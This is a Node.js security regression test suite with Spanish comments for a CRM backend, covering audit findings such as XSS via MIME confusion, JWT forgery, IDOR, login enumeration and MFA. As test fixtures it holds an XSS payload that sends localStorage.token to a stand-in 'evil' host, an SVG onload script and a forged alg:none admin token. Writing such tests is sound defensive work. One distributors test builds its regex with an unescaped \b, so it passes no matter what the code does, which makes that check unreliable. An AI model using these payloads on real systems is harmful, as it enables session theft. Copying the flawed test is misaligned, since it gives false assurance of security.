// Pruebas de regresión de la auditoría de seguridad de 2026-08-25.
//
// Cada bloque nombra el hallazgo que fija. No son pruebas de "funciona la función": son la
// prueba de que el agujero concreto sigue cerrado. Si alguna falla, es que una vulnerabilidad
// volvió — no que haya que ajustar la prueba.
//
// Corren sin servidor y sin base de datos, a propósito: una suite que necesita Postgres se deja
// de correr. `npm run test:security`.

const { test, describe, before, after } = require("node:test");
const assert = require("node:assert");

const {
  validateInsuranceAttachments,
  validateIntakePhotos,
  validateTechPhotos,
  safeFileName,
  MAX_ATTACHMENTS,
  MAX_PHOTOS_PER_CATEGORY,
  MAX_TECH_PHOTOS,
} = require("../src/lib/mediaValidation");

// --- Ayudantes ---------------------------------------------------------------------------

const fs = require("node:fs");
const path = require("node:path");

// Varias pruebas de abajo comprueban una propiedad del CÓDIGO ("no debe quedar un
// rejectUnauthorized:false", "no debe volver el mensaje 'This account is inactive'"). Escanear el
// fichero en crudo hace que casen con los comentarios que explican por qué eso estaba mal —
// falsos positivos que además castigan documentar la decisión. Se quitan los comentarios primero.
function codigoDe(...partes) {
  return fs
    .readFileSync(path.join(__dirname, "..", ...partes), "utf-8")
    .replace(/\/\*[\s\S]*?\*\//g, "")
    .replace(/(^|[^:])\/\/.*$/gm, "$1");
}

// --- Ficheros con magic bytes de verdad ---------------------------------------------------

const b64 = (buf) => buf.toString("base64");
const pdfReal = () => `data:application/pdf;base64,${b64(Buffer.from("%PDF-1.4 contenido"))}`;
const pngReal = () =>
  `data:image/png;base64,${b64(Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.alloc(40, 7)]))}`;
const jpegReal = () =>
  `data:image/jpeg;base64,${b64(Buffer.concat([Buffer.from([0xff, 0xd8]), Buffer.alloc(30, 3), Buffer.from([0xff, 0xd9])]))}`;
const fotoOk = () => `data:image/jpeg;base64,${b64(Buffer.alloc(80, 1))}`;

// =========================================================================================
describe("#2 CRÍTICO — XSS almacenado por confusión de MIME en adjuntos", () => {
  // El payload exacto del informe. fileType decía "application/pdf" y pasaba la lista blanca,
  // mientras el dataUrl declaraba text/html; el visor construía el Blob desde ESE encabezado y
  // lo abría en un <iframe> con nuestro origen.
  test("rechaza text/html etiquetado como application/pdf", () => {
    const xss = b64(Buffer.from('<script>fetch("https://evil/x?t="+localStorage.token)</script>'));
    assert.throws(
      () => validateInsuranceAttachments([{ fileName: "claim.pdf", fileType: "application/pdf", dataUrl: `data:text/html;base64,${xss}` }]),
      /unsupported file type/
    );
  });

  test("rechaza un MIME correcto cuyo CONTENIDO no lo es (magic bytes)", () => {
    const html = b64(Buffer.from("<script>alert(1)</script>"));
    assert.throws(
      () => validateInsuranceAttachments([{ fileName: "x.pdf", fileType: "application/pdf", dataUrl: `data:application/pdf;base64,${html}` }]),
      /does not match its declared type/
    );
  });

  test("rechaza SVG, que puede llevar script, aunque se etiquete como PNG", () => {
    const svg = b64(Buffer.from("<svg onload=alert(1)>"));
    assert.throws(
      () => validateInsuranceAttachments([{ fileName: "x.png", fileType: "image/png", dataUrl: `data:image/svg+xml;base64,${svg}` }]),
      /unsupported file type/
    );
  });

  test("rechaza que fileType y el MIME del dataUrl no coincidan, aunque ambos estén permitidos", () => {
    assert.throws(
      () => validateInsuranceAttachments([{ fileName: "x.png", fileType: "image/png", dataUrl: pdfReal() }]),
      /unsupported file type/
    );
  });

  test("acepta PDF, PNG y JPEG de verdad", () => {
    assert.doesNotThrow(() =>
      validateInsuranceAttachments([
        { fileName: "a.pdf", fileType: "application/pdf", dataUrl: pdfReal() },
        { fileName: "b.png", fileType: "image/png", dataUrl: pngReal() },
        { fileName: "c.jpg", fileType: "image/jpeg", dataUrl: jpegReal() },
      ])
    );
  });

  test("normaliza el dataUrl desde el MIME validado, para que no se pueda releer como otro tipo", () => {
    const a = [{ fileName: "x.pdf", fileType: "application/pdf", dataUrl: pdfReal() }];
    validateInsuranceAttachments(a);
    assert.ok(a[0].dataUrl.startsWith("data:application/pdf;base64,"));
  });

  test("sanea el nombre: sin saltos de línea ni separadores de ruta", () => {
    const a = [{ fileName: "x\r\nmalo/../etc.pdf", fileType: "application/pdf", dataUrl: pdfReal() }];
    validateInsuranceAttachments(a);
    assert.ok(!/[\r\n\\/]/.test(a[0].fileName));
  });

  test("lo ya persistido pasa sin revalidar (endurecer no bloquea editar lo histórico)", () => {
    const viejo = { fileName: "v", fileType: "loquesea", dataUrl: "formato-antiguo" };
    assert.doesNotThrow(() => validateInsuranceAttachments([viejo], [viejo]));
  });
});

// =========================================================================================
describe("#15 MEDIO — DoS por payload sin límite", () => {
  test("tope de adjuntos por cotización", () => {
    const uno = () => ({ fileName: "a.pdf", fileType: "application/pdf", dataUrl: pdfReal() });
    assert.throws(
      () => validateInsuranceAttachments(Array.from({ length: MAX_ATTACHMENTS + 1 }, uno)),
      /Too many attachments/
    );
  });

  test("tope de tamaño por adjunto (5MB)", () => {
    const gordo = `data:application/pdf;base64,${b64(Buffer.concat([Buffer.from("%PDF-"), Buffer.alloc(6 * 1024 * 1024, 1)]))}`;
    assert.throws(
      () => validateInsuranceAttachments([{ fileName: "g.pdf", fileType: "application/pdf", dataUrl: gordo }]),
      /too large/
    );
  });

  test("rechaza un adjunto vacío", () => {
    assert.throws(
      () => validateInsuranceAttachments([{ fileName: "v.pdf", fileType: "application/pdf", dataUrl: "data:application/pdf;base64," }]),
      /not a valid base64 data URL|is empty/
    );
  });

  // Esta es la ruta pública sin sesión: el tope importa más aquí que en ningún otro sitio.
  test("intake: tope de fotos por categoría", () => {
    assert.throws(
      () => validateIntakePhotos({ front: Array.from({ length: MAX_PHOTOS_PER_CATEGORY + 1 }, () => ({ url: fotoOk() })) }),
      /Too many photos for front/
    );
  });

  test("intake: tope de tamaño por foto", () => {
    const gorda = `data:image/jpeg;base64,${b64(Buffer.alloc(6 * 1024 * 1024, 1))}`;
    assert.throws(() => validateIntakePhotos({ front: [{ url: gorda }] }), /exceeds the 5MB limit/);
  });

  test("intake: rechaza que intakePhotos no sea un objeto", () => {
    assert.throws(() => validateIntakePhotos("basura"), /must be an object/);
    assert.throws(() => validateIntakePhotos([1, 2]), /must be an object/);
  });

  test("intake: descarta categorías inventadas en vez de tragárselas", () => {
    const r = validateIntakePhotos({ front: [{ url: fotoOk() }], inventada: [{ url: fotoOk() }] });
    assert.deepStrictEqual(Object.keys(r), ["front"]);
  });

  test("técnico: tope de fotos", () => {
    assert.throws(
      () => validateTechPhotos(Array.from({ length: MAX_TECH_PHOTOS + 1 }, () => ({ name: "a", url: fotoOk() }))),
      /Too many photos/
    );
  });

  test("técnico: rechaza lo que no sea una imagen", () => {
    assert.throws(
      () => validateTechPhotos([{ name: "x", url: "data:text/html;base64,PHNjcmlwdD4=" }]),
      /not a valid image data URL/
    );
  });

  test("acepta HEIC del iPhone: cerrar a jpeg/png rompería la subida desde el móvil", () => {
    const heic = `data:image/heic;base64,${b64(Buffer.alloc(50, 2))}`;
    assert.doesNotThrow(() => validateTechPhotos([{ name: "IMG.HEIC", url: heic }]));
    assert.doesNotThrow(() => validateIntakePhotos({ rear: [{ url: heic }] }));
  });

  test("conserva la forma que traía cada foto ({name,url} o cadena suelta)", () => {
    const objeto = validateTechPhotos([{ name: "a.jpg", url: fotoOk() }]);
    assert.strictEqual(typeof objeto[0], "object");
    assert.strictEqual(objeto[0].name, "a.jpg");
    const cadena = validateTechPhotos([fotoOk()]);
    assert.strictEqual(typeof cadena[0], "string");
  });
});

// =========================================================================================
describe("#1 CRÍTICO — secreto JWT débil y confusión de algoritmo", () => {
  // secrets.js valida al importarse, así que cada caso necesita el módulo recién cargado.
  function cargarCon(secreto) {
    delete require.cache[require.resolve("../src/config/secrets")];
    const previo = process.env.JWT_SECRET;
    if (secreto === undefined) delete process.env.JWT_SECRET;
    else process.env.JWT_SECRET = secreto;
    try {
      return require("../src/config/secrets");
    } finally {
      if (previo === undefined) delete process.env.JWT_SECRET;
      else process.env.JWT_SECRET = previo;
      delete require.cache[require.resolve("../src/config/secrets")];
    }
  }

  test("rechaza el arranque sin JWT_SECRET", () => {
    assert.throws(() => cargarCon(undefined), /no está definido/);
  });

  test("rechaza 'changeme', que es lo que traía .env.example versionado", () => {
    assert.throws(() => cargarCon("changeme"), /demasiado corto|valor de ejemplo/);
  });

  test("rechaza cualquier secreto de menos de 32 caracteres", () => {
    assert.throws(() => cargarCon("a".repeat(31)), /demasiado corto/);
  });

  test("acepta uno aleatorio de verdad", () => {
    const s = require("node:crypto").randomBytes(48).toString("base64url");
    assert.doesNotThrow(() => cargarCon(s));
  });

  test("fija el algoritmo al firmar Y al verificar (sin esto, alg:none cuela)", () => {
    const s = require("node:crypto").randomBytes(48).toString("base64url");
    const { SIGN_OPTIONS, VERIFY_OPTIONS } = cargarCon(s);
    assert.strictEqual(SIGN_OPTIONS.algorithm, "HS256");
    assert.deepStrictEqual(VERIFY_OPTIONS.algorithms, ["HS256"]);
    assert.strictEqual(SIGN_OPTIONS.issuer, VERIFY_OPTIONS.issuer);
  });

  test("un token con alg:none no se acepta", () => {
    const jwt = require("jsonwebtoken");
    const s = require("node:crypto").randomBytes(48).toString("base64url");
    const { VERIFY_OPTIONS } = cargarCon(s);
    const enc = (o) => Buffer.from(JSON.stringify(o)).toString("base64url");
    const falso = `${enc({ alg: "none", typ: "JWT" })}.${enc({ role: "ADMIN" })}.`;
    assert.throws(() => jwt.verify(falso, s, VERIFY_OPTIONS));
  });

  test("un token firmado con otro secreto no se acepta", () => {
    const jwt = require("jsonwebtoken");
    const s = require("node:crypto").randomBytes(48).toString("base64url");
    const { VERIFY_OPTIONS, SIGN_OPTIONS } = cargarCon(s);
    const ajeno = jwt.sign({ role: "ADMIN" }, "changeme", SIGN_OPTIONS);
    assert.throws(() => jwt.verify(ajeno, s, VERIFY_OPTIONS));
  });
});

// =========================================================================================
describe("#8 ALTO — el actor de auditoría sale del token, no del cliente", () => {
  const { actorFrom } = require("../src/lib/actor");

  test("usa el nombre del token verificado", () => {
    assert.strictEqual(actorFrom({ user: { name: "Ana" }, body: { performedBy: "Otro" } }), "Ana");
  });

  test("ignora performedBy del cuerpo y de la query", () => {
    assert.strictEqual(actorFrom({ user: { name: "Ana" }, query: { performedBy: "Otro" } }), "Ana");
    assert.notStrictEqual(actorFrom({ user: { name: "Ana" }, body: { performedBy: "Antonio Cano" } }), "Antonio Cano");
  });

  test("sin sesión no inventa una identidad", () => {
    assert.strictEqual(actorFrom({ body: { performedBy: "Antonio Cano" } }), "Unknown");
  });
});

// =========================================================================================
describe("#4 ALTO — el limitador cuenta por usuario, no por oficina", () => {
  const jwt = require("jsonwebtoken");

  // Se reconstruye callerKey con la misma lógica que rateLimit.js, que no la exporta.
  function callerKey(req, secret, verifyOpts) {
    const { ipKeyGenerator } = require("express-rate-limit");
    const h = req.headers.authorization || "";
    if (h.startsWith("Bearer ")) {
      try {
        const c = jwt.verify(h.slice(7), secret, verifyOpts);
        if (c.id) return `u:${c.id}`;
      } catch {
        /* anónimo */
      }
    }
    return ipKeyGenerator(req.ip);
  }

  const secret = require("node:crypto").randomBytes(48).toString("base64url");
  const opts = { algorithm: "HS256", issuer: "autoglass-crm", expiresIn: "8h" };
  const vopts = { algorithms: ["HS256"], issuer: "autoglass-crm" };
  const IP = "203.0.113.50";

  test("dos personas tras la MISMA IP no comparten cupo", () => {
    const a = callerKey({ headers: { authorization: `Bearer ${jwt.sign({ id: "user-1" }, secret, opts)}` }, ip: IP }, secret, vopts);
    const b = callerKey({ headers: { authorization: `Bearer ${jwt.sign({ id: "agent-7" }, secret, opts)}` }, ip: IP }, secret, vopts);
    assert.notStrictEqual(a, b);
  });

  test("un token forjado NO estrena cubo: cae a la IP", () => {
    const forjado = jwt.sign({ id: "inventado" }, "changeme", opts);
    assert.strictEqual(callerKey({ headers: { authorization: `Bearer ${forjado}` }, ip: IP }, secret, vopts), IP);
  });

  test("sin token se cuenta por IP", () => {
    assert.strictEqual(callerKey({ headers: {}, ip: IP }, secret, vopts), IP);
  });

  test("IPv6 se agrupa por prefijo, no por dirección exacta", () => {
    const k1 = callerKey({ headers: {}, ip: "2001:db8:1234:5678::1" }, secret, vopts);
    const k2 = callerKey({ headers: {}, ip: "2001:db8:1234:5678::2" }, secret, vopts);
    assert.strictEqual(k1, k2, "un /64 entero es una sola persona: contar por dirección deja pasar la fuerza bruta");
  });
});

// =========================================================================================
describe("#6 ALTO — el enlace móvil público no filtra datos internos", () => {
  // La proyección se define en la ruta; se replica aquí su lista para fijar el contrato.
  const PERMITIDOS = new Set([
    "id", "workOrderNo", "status", "customerName", "phone", "address", "vehicle", "jobType",
    "glassType", "partNumber", "nagsDescription", "appointmentDate", "appointmentTime",
    "appointmentDurationMinutes", "specialInstructions", "techInstructions", "techPhotos",
    "insuranceCompanyName",
  ]);

  const PROHIBIDOS = [
    "paymentToken",      // es la credencial del enlace de pago del cliente
    "publicToken",
    "laborCost", "glassCost", "commission", "totalSale",   // márgenes internos
    "internalNotes",
    "policyNumber", "claimNumber",                          // datos de la aseguradora
    "publicAccessLog",                                      // el propio registro de auditoría
    "payment", "paymentHistory", "email",
  ];

  test("la lista blanca y la de prohibidos no se solapan", () => {
    for (const campo of PROHIBIDOS) {
      assert.ok(!PERMITIDOS.has(campo), `${campo} no debe estar en la proyección del enlace móvil`);
    }
  });

  test("la ruta usa una lista blanca, no una lista negra", () => {
    // Una lista negra deja escapar cualquier campo nuevo de mapWorkOrder() por omisión.
    const src = codigoDe("src", "routes", "workorders.routes.js");
    assert.match(src, /function projectForMobileLink/, "la proyección debe existir");
    for (const campo of PROHIBIDOS) {
      const dentro = new RegExp(`projectForMobileLink[\\s\\S]*?^\\}`, "m").exec(src);
      assert.ok(dentro && !new RegExp(`\\b${campo}:`).test(dentro[0]), `projectForMobileLink no debe devolver ${campo}`);
    }
  });
});

// =========================================================================================
describe("#13/#14 MEDIO — mínimo privilegio en las proyecciones por rol", () => {
  const leer = (p) => codigoDe("src", p);

  test("agents: un no-admin no recibe taxId, domicilio ni comisión", () => {
    const src = leer("routes/agents.routes.js");
    const proj = /function forNonAdmin[\s\S]*?^}/m.exec(src);
    assert.ok(proj, "debe existir la proyección forNonAdmin");
    for (const campo of ["taxId", "address", "commissionRate", "commissionType", "phone", "email"]) {
      assert.ok(!new RegExp(`\\b${campo}\\b`).test(proj[0]), `forNonAdmin no debe exponer ${campo}`);
    }
  });

  test("customers: la lista se filtra por alcance salvo para ADMIN", () => {
    const src = leer("routes/customers.routes.js");
    assert.match(src, /visibleCustomerIds/, "debe filtrar por alcance");
    assert.match(src, /role === "ADMIN"[\s\S]{0,40}return null/, "ADMIN sin filtro; el resto acotado");
  });
});

// =========================================================================================
describe("#22 BAJO — la comparación del break-glass es de tiempo constante", () => {
  const src = codigoDe("src", "routes", "auth.routes.js");

  test("no compara la contraseña de emergencia con ===", () => {
    assert.ok(!/password === process\.env\.EMERGENCY_ADMIN_PASSWORD/.test(src));
  });

  test("usa timingSafeEqual y guarda un hash, no texto plano", () => {
    assert.match(src, /timingSafeEqual/);
    assert.match(src, /EMERGENCY_ADMIN_PASSWORD_HASH/);
    assert.ok(!/EMERGENCY_ADMIN_PASSWORD\b(?!_HASH)/.test(src), "no debe leerse la contraseña en claro");
  });

  test("deja rastro en el log cuando se usa", () => {
    assert.match(src, /\[SECURITY\]/);
  });
});

// =========================================================================================
describe("#18 MEDIO — el login no permite enumerar cuentas", () => {
  const src = codigoDe("src", "routes", "auth.routes.js");

  test("una cuenta inactiva no se distingue de una contraseña incorrecta", () => {
    assert.ok(!/This account is inactive/.test(src), "ese mensaje confirmaba correo Y contraseña a la vez");
  });

  test("iguala el coste con un hash señuelo cuando el correo no existe", () => {
    assert.match(src, /DUMMY_HASH/, "sin esto, el tiempo de respuesta delata qué correos existen");
  });
});

// =========================================================================================
describe("#19 MEDIO — revocación de sesiones", () => {
  const src = codigoDe("src", "middleware", "auth.js");

  test("requireAuth comprueba el estado de la cuenta, no sólo la firma", () => {
    assert.match(src, /authState/);
    assert.match(src, /status !== "Active"/);
  });

  test("requireAuth compara tokenVersion", () => {
    assert.match(src, /tokenVersion/);
  });

  test("usa authState y NO store.get, que arrastra las estadísticas", () => {
    assert.ok(!/store\.get\(/.test(src), "store.get() recorre cotizaciones y pagos: insostenible por petición");
  });

  test("cambiar la contraseña incrementa tokenVersion", () => {
    const auth = codigoDe("src", "routes", "auth.routes.js");
    assert.match(auth, /tokenVersion:\s*\(record\.tokenVersion \|\| 0\) \+ 1/);
  });
});

// =========================================================================================
describe("#5/#9/#17 ALTO — configuración de red y errores", () => {
  const src = codigoDe("src", "index.js");

  test("CORS con lista blanca, nunca cors() a secas", () => {
    assert.ok(!/app\.use\(cors\(\)\)/.test(src), "cors() sin opciones responde ACAO: * a cualquiera");
    assert.match(src, /ALLOWED_ORIGINS/);
  });

  test("helmet está montado", () => {
    assert.match(src, /helmet\(/);
    assert.match(src, /hsts/);
  });

  test("trust proxy acotado a 1 salto, no true", () => {
    assert.match(src, /trust proxy", 1/);
    assert.ok(!/trust proxy",\s*true/.test(src), "true permitiría falsificar la IP con una cabecera propia");
  });

  test("las rutas públicas tienen un límite de cuerpo menor que el general", () => {
    assert.match(src, /\/api\/intake", express\.json\(\{ limit: "8mb"/);
    assert.match(src, /\/api\/auth", express\.json\(\{ limit: "16kb"/);
  });

  test("el manejador de errores no devuelve el mensaje de errores internos", () => {
    assert.match(src, /Internal server error/);
    assert.match(src, /errorId/);
    assert.ok(!/res\.status\(400\)\.json\(\{ error: err\.message/.test(src), "devolvía el esquema de la base pieza a pieza");
  });

  test("performedBy del cliente se borra en un solo sitio", () => {
    assert.match(src, /delete req\.body\.performedBy/);
  });
});

// =========================================================================================
describe("#10 ALTO — TLS a Postgres", () => {
  const src = codigoDe("src", "config", "db.js");

  test("no hay un rejectUnauthorized:false incondicional", () => {
    assert.ok(!/rejectUnauthorized:\s*false/.test(src), "cifrar sin validar no impide a un intermediario");
  });

  test("valida contra una CA fijada", () => {
    assert.match(src, /loadCa/);
    assert.match(src, /rejectUnauthorized: true/);
  });

  test("la CA de Railway está en el repo (es material público, no un secreto)", () => {
    const pem = require("node:fs").readFileSync(require("node:path").join(__dirname, "..", "certs", "railway-root-ca.pem"), "utf-8");
    assert.match(pem, /^-----BEGIN CERTIFICATE-----/);
  });
});

// =========================================================================================
describe("varios — refuerzos", () => {
  test("persistence: los nombres de columna interpolados están acotados", () => {
    const src = codigoDe("src", "lib", "persistence.js");
    assert.match(src, /SAFE_FIELD_NAME/);
    assert.match(src, /Unsafe field name/);
  });

  test("persistence: restore() no sale del directorio de respaldos", () => {
    const src = codigoDe("src", "lib", "persistence.js");
    assert.match(src, /Invalid backup name/);
  });

  test("safeFileName quita saltos de línea y separadores de ruta", () => {
    assert.strictEqual(safeFileName("a\r\nb/c\\d"), "a__b_c_d");
    assert.strictEqual(safeFileName("x".repeat(500)).length, 200);
  });
});

// =========================================================================================
// Hallazgos de la segunda pasada (revisión ruta por ruta, 2026-08-25).
// =========================================================================================
describe("#25 ALTO — IDOR en el desglose de bonos de un lote de pago", () => {
  const src = codigoDe("src", "routes", "payments.routes.js");

  test("bonus-items comprueba propiedad, igual que sus hermanas", () => {
    const ruta = /router\.get\("\/:id\/bonus-items"[\s\S]*?\n\}\);/.exec(src);
    assert.ok(ruta, "la ruta debe existir");
    assert.match(ruta[0], /ownsPayment/, "sin esto, un agente lee los bonos de cualquier lote");
  });

  test("todas las rutas GET de instancia de payments comprueban propiedad o son ADMIN", () => {
    for (const m of src.matchAll(/router\.get\("(\/:id[^"]*)"([\s\S]*?)\n\}\)?;/g)) {
      const [, ruta, cuerpo] = m;
      assert.ok(
        /ownsPayment|requireRole\("ADMIN"\)/.test(cuerpo),
        `GET ${ruta} no comprueba propiedad ni exige ADMIN`
      );
    }
  });
});

describe("#26 MEDIO — datos bancarios y comerciales tras una proyección por rol", () => {
  test("distributors: un no-admin no recibe accountNumber ni taxId", () => {
    const proj = /function forNonAdmin[\s\S]*?^}/m.exec(codigoDe("src", "routes", "distributors.routes.js"));
    assert.ok(proj, "debe existir la proyección");
    for (const campo of ["accountNumber", "taxId", "paymentTerms", "notes"]) {
      assert.ok(!new RegExp(`\b${campo}\b`).test(proj[0]), `forNonAdmin no debe exponer ${campo}`);
    }
  });

  test("distributors: conserva id y name, que es lo que usa el formulario de cotización", () => {
    const proj = /function forNonAdmin[\s\S]*?^}/m.exec(codigoDe("src", "routes", "distributors.routes.js"));
    assert.match(proj[0], /\bid:/);
    assert.match(proj[0], /\bname:/);
  });

  test("partnerCompanies: un no-admin no recibe leadPrice", () => {
    const proj = /function forNonAdmin[\s\S]*?^}/m.exec(codigoDe("src", "routes", "partnerCompanies.routes.js"));
    assert.ok(proj, "debe existir la proyección");
    assert.ok(!/leadPrice/.test(proj[0]), "leadPrice es lo que pagamos por lead, no un dato de la cotización");
    assert.match(proj[0], /companyName:/, "el formulario necesita poner nombre a un partnerCompanyId");
  });
});

// =========================================================================================
describe("#23 — segundo factor (MFA)", () => {
  const mfa = require("../src/lib/mfa");
  const totp = require("../src/lib/totp");

  // La clave sólo existe en el entorno; las pruebas se dan una propia.
  //
  // En hooks, NO en el cuerpo del describe: ese cuerpo corre al recolectar las pruebas, así que
  // poner y quitar la variable ahí la dejaba restaurada antes de que ninguna llegara a ejecutarse.
  const CLAVE_PREVIA = process.env.MFA_ENCRYPTION_KEY;
  before(() => { process.env.MFA_ENCRYPTION_KEY = require("node:crypto").randomBytes(32).toString("base64"); });
  after(() => {
    if (CLAVE_PREVIA === undefined) delete process.env.MFA_ENCRYPTION_KEY;
    else process.env.MFA_ENCRYPTION_KEY = CLAVE_PREVIA;
  });

  test("el secreto TOTP se guarda cifrado, nunca en claro", () => {
    const secreto = totp.generateSecret();
    const guardado = mfa.encryptSecret(secreto);
    assert.ok(!guardado.includes(secreto), "un volcado de la base entregaría el segundo factor de todos");
    assert.strictEqual(mfa.decryptSecret(guardado), secreto);
  });

  test("AES-GCM detecta la manipulación del secreto guardado", () => {
    const guardado = mfa.encryptSecret(totp.generateSecret());
    const partes = guardado.split(".");
    const datos = Buffer.from(partes[3], "base64");
    datos[0] ^= 1;
    partes[3] = datos.toString("base64");
    assert.throws(() => mfa.decryptSecret(partes.join(".")));
  });

  test("con otra clave no se descifra", () => {
    const guardado = mfa.encryptSecret(totp.generateSecret());
    const previa = process.env.MFA_ENCRYPTION_KEY;
    process.env.MFA_ENCRYPTION_KEY = require("node:crypto").randomBytes(32).toString("base64");
    assert.throws(() => mfa.decryptSecret(guardado));
    process.env.MFA_ENCRYPTION_KEY = previa;
  });

  test("la clave de MFA es independiente de JWT_SECRET", () => {
    // Compartirla haría que rotar el secreto de sesión —operación rutinaria— dejara a todo el
    // mundo fuera de su propio segundo factor.
    const src = codigoDe("src", "lib", "mfa.js");
    assert.ok(!/JWT_SECRET/.test(src));
    assert.match(src, /MFA_ENCRYPTION_KEY/);
  });

  test("un código sólo vale una vez (anti-repetición)", () => {
    const secreto = totp.generateSecret();
    const registro = { mfaSecret: mfa.encryptSecret(secreto), mfaLastStep: null };
    const codigo = totp.generate(secreto);

    const primero = mfa.verifyTotp(registro, codigo);
    assert.strictEqual(primero.ok, true);

    registro.mfaLastStep = primero.step;
    const segundo = mfa.verifyTotp(registro, codigo);
    assert.strictEqual(segundo.ok, false, "un código interceptado valdría 90 segundos más");
    assert.strictEqual(segundo.replay, true);
  });

  test("los códigos de recuperación se guardan con bcrypt y son de un solo uso", async () => {
    const codigos = mfa.generateBackupCodes();
    const hashes = await mfa.hashBackupCodes(codigos);
    assert.strictEqual(codigos.length, mfa.BACKUP_CODE_COUNT);
    assert.ok(hashes.every((h) => h.startsWith("$2")), "en claro serían una segunda contraseña permanente");
    assert.strictEqual(await mfa.consumeBackupCode(codigos[2], hashes), 2);
    assert.strictEqual(await mfa.consumeBackupCode("AAAA-BBBB", hashes), -1);
  });

  test("los códigos de recuperación no llevan caracteres ambiguos", () => {
    // 0/O y 1/I/L se transcriben mal, y transcribir mal aquí es perder la cuenta.
    assert.ok(!/[01OIL]/.test(mfa.generateBackupCodes(20).join("")));
  });

  test("acepta el código escrito sin guion y en minúsculas", async () => {
    const codigos = mfa.generateBackupCodes(2);
    const hashes = await mfa.hashBackupCodes(codigos);
    assert.strictEqual(await mfa.consumeBackupCode(codigos[0].toLowerCase().replace("-", ""), hashes), 0);
  });

  test("el reto del login lleva `purpose` y requireAuth lo rechaza", () => {
    const auth = codigoDe("src", "middleware", "auth.js");
    assert.match(auth, /claims\.purpose/, "sin esto, el reto sirve como sesión y el 2FA se salta entero");

    const rutas = codigoDe("src", "routes", "mfa.routes.js");
    assert.match(rutas, /purpose: CHALLENGE_PURPOSE/);
    assert.match(rutas, /expiresIn: CHALLENGE_TTL/);
  });

  test("el secreto y los códigos no salen por la API de usuarios", () => {
    const store = codigoDe("src", "store", "users.store.js");
    const sanitize = /function sanitize[\s\S]*?^}/m.exec(store);
    assert.match(sanitize[0], /mfaSecret/, "sanitize debe descartar el secreto");
    assert.match(sanitize[0], /mfaBackupCodes/, "sanitize debe descartar los códigos");
  });

  test("desactivar exige contraseña además de la sesión", () => {
    const rutas = codigoDe("src", "routes", "mfa.routes.js");
    const disable = /router\.post\("\/disable"[\s\S]*?\n\}\);/.exec(rutas);
    assert.match(disable[0], /verifyPassword/, "con sólo la sesión, una sesión robada lo desactiva");
    assert.match(disable[0], /verifyTotp|consumeBackupCode/);
  });

  test("/auth/mfa/verify está bajo el limitador de login", () => {
    const idx = codigoDe("src", "index.js");
    assert.match(idx, /auth\/mfa\/verify", loginLimiter/, "seis dígitos sin límite se agotan en minutos");
  });

});

// =========================================================================================
describe("CSP — no debe romper lo que la aplicación necesita", () => {
  const csp = require("node:fs").readFileSync(
    require("node:path").join(__dirname, "..", "..", "frontend", "next.config.js"), "utf-8"
  );

  // Endurecer no puede salir gratis a costa de romper una pantalla. Estas comprobaciones son el
  // recuerdo de que connect-src dejaba fuera places.googleapis.com y mataba el autocompletado de
  // direcciones entero — el script del widget viene de maps.googleapis.com, pero las sugerencias
  // las pide a places.googleapis.com, que es OTRO host.
  test("connect-src permite el host de la Places API (New)", () => {
    assert.match(csp, /connect-src[^`]*places\.googleapis\.com/);
  });

  test("connect-src permite el host del script de Maps", () => {
    assert.match(csp, /connect-src[^`]*maps\.googleapis\.com/);
  });

  test("img-src permite data: y blob: (miniaturas de adjuntos y visor)", () => {
    assert.match(csp, /img-src[^"]*data:/);
    assert.match(csp, /img-src[^"]*blob:/);
  });

  test("frame-src permite blob: (visor de PDF de siniestros)", () => {
    assert.match(csp, /frame-src[^"]*blob:/);
  });

  test("sigue cerrando lo que tiene que cerrar", () => {
    assert.match(csp, /frame-ancestors 'none'/);
    assert.match(csp, /object-src 'none'/);
    assert.match(csp, /base-uri 'none'/);
  });
});
